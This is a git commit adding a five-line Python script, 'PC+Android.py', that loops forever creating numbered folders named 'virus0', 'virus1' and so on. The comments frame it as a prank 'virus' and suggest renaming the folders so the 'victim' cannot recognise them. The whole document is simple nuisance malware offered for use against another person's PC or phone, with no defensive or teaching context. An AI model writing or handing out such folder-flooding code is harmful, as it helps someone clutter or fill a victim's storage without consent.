68fda8a43f4e57140ae89e719444b32b00accc52
Mahidul Islam <75845610+M4H1D@users.noreply.github.com>
2021-01-02 01:25:15 +0600

    Create PC+Android.py

---
+++ PC+Android.py
@@ -0,0 +1,5 @@
+import os 
+i=0
+while True:
+	os.mkdir(f"virus{i}")   #mkdir means make a folder and it's name will be shown by virus.But we can cange folder name..so that,victim can't recognise that is a virus fake folder...
+	i+=1  #here you can use any number.
